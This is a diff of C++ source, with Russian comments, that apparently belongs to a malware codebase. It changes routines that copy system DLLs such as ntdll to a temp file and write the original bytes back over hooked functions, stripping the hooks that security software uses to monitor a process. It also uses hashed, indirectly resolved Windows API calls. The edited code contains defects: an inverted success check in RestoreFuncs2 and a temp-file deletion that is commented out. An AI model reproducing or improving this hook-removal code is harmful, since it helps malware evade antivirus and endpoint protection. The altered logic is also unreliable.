@@ -43,7 +43,6 @@ bool CanRestoreFunc(const char* Name, PDWORD ProcNameHashes)
 void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNameHashes)
 {
 	const static DWORD RestoreSize = 10;
-
 	// Получаем заголовок dll
 	PIMAGE_NT_HEADERS OriginalHeaders = Unhook_GetNTHeaders(OriginalImage);
 	PIMAGE_NT_HEADERS CurrentHeaders  = Unhook_GetNTHeaders(CurrentImage);
@@ -59,12 +58,12 @@ void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNam
     // Перебираем все функции и определяем необходимоть вотановления
 	PDWORD NameRef = (PDWORD)(OriginalImage + OriginalExports->AddressOfNames);
 	PWORD  Ordinal = (PWORD)(OriginalImage + OriginalExports->AddressOfNameOrdinals);
+	PWORD  Ordinal2 = (PWORD)(CurrentImage + CurrentExports->AddressOfNameOrdinals);
 
-	for (int i = 0; i < OriginalExports->NumberOfNames; i++, NameRef++, Ordinal++)
+	for (int i = 0; i < OriginalExports->NumberOfNames; i++, NameRef++, Ordinal++, Ordinal2++)
 	{
 		PCHAR Name = (PCHAR)(OriginalImage + *NameRef);
 		if (!CanRestoreFunc(Name, ProcNameHashes)) continue;
-
 		// Получаем указатели на функции в обоих dll
         WORD idx = *Ordinal;
 		LPBYTE OriginalFunc = (OriginalImage + *(PDWORD)(OriginalImage + OriginalExports->AddressOfFunctions + (idx*4)));
@@ -136,27 +135,25 @@ void WINAPI UnhookFunc(LPVOID OriginalImage, const char *Dll, PDWORD NameHashes)
 //---------------------------------------------------------------------------
 
 
-string CopyDllToTemp(const char* Dll)
+// Копируем dll во временный файл
+char* CopyDllToTemp( const char* nameDll, char* nameTemp )
 {
-	// Копируем dll во временный файл
-	string TempName;
-
-	HMODULE Module = (HMODULE)pGetModuleHandleA(Dll);
-	if (Module)
+	HMODULE module = (HMODULE)pGetModuleHandleA(nameDll);
+	if( module )
 	{
-		string Name(MAX_PATH);
-		pGetModuleFileNameA(Module, Name.t_str(), MAX_PATH);
-		if (!Name.IsEmpty())
+		char pathDll[MAX_PATH];
+		pathDll[0] = 0;
+		int len = (int)pGetModuleFileNameA( module, pathDll, sizeof(pathDll) );
+		if( len > 0 )
 		{
-			TempName = File::GetTempName2A();
-			if (!pCopyFileA(Name.t_str(), TempName.t_str(), FALSE))
+			File::GetTempName(nameTemp);
+			if( pCopyFileA( pathDll, nameTemp, FALSE ) )
 			{
-				// В случае ошибки копирования обнуляем имя файла
-				TempName.Clear();
+				return nameTemp;
 			}
-		}
-	}
-    return TempName;
+        }
+    }
+    return 0;
 }
 //---------------------------------------------------------------------------
 
@@ -165,13 +162,11 @@ string CopyDllToTemp(const char* Dll)
 void WINAPI RestoreFuncs(TDllId Dll, DWORD *dwFuncMass)
 {
 	PCHAR DllName  = GetDLLName(Dll);
-	string TempDll = CopyDllToTemp(DllName);
-
-	if (TempDll.IsEmpty())
+	char TempDll[MAX_PATH];
+	if( CopyDllToTemp( DllName, TempDll ) == 0 )
 		return;
 
-
- 	HANDLE hFile = CreateFileA(TempDll.t_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
+ 	HANDLE hFile = pCreateFileA( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
 	
 	HANDLE	hMapping = NULL;
 	LPVOID	hMap     = NULL;
@@ -197,7 +192,7 @@ void WINAPI RestoreFuncs(TDllId Dll, DWORD *dwFuncMass)
 
 	pCloseHandle( hFile );
 
-	pDeleteFileA(TempDll.t_str());
+//	pDeleteFileA(TempDll);
 }
 
 
@@ -241,12 +236,11 @@ void WINAPI UnhookFunc2( LPVOID hMap, const char *Dll, DWORD dwProcVA )
 /* Восстанавливает вектор неэкспортируемых функций по их VA             */
 void WINAPI RestoreFuncs2( const char *Dll, DWORD *dwFuncMass)
 {
-	string TempDll = CopyDllToTemp(Dll);
-
-	if (TempDll.IsEmpty())
+	char TempDll[MAX_PATH];
+	if( CopyDllToTemp( Dll, TempDll ) )
 		return;
 
-	HANDLE hFile = pCreateFileA( TempDll.t_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
+	HANDLE hFile = pCreateFileA( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
 	
 	HANDLE	hMapping = NULL;
 	LPVOID	hMap     = NULL;
@@ -274,7 +268,7 @@ void WINAPI RestoreFuncs2( const char *Dll, DWORD *dwFuncMass)
 	pCloseHandle( hMapping );
 	pCloseHandle( hFile );
 
-	pDeleteFileA(TempDll.t_str());
+	pDeleteFileA(TempDll);
 }
 
 
@@ -519,7 +513,6 @@ void UnhookDlls()
 	DWORD dwWinspool[] ={ C_ENUMPRINTERSA, 0 };
 
 	DWORD dwCommDlg[] ={ C_GETSAVEFILENAMEA, C_GETOPENFILENAMEA, 0 };
-
 
 
 	RestoreFuncs( DLL_NTDLL,     dwNtdll);
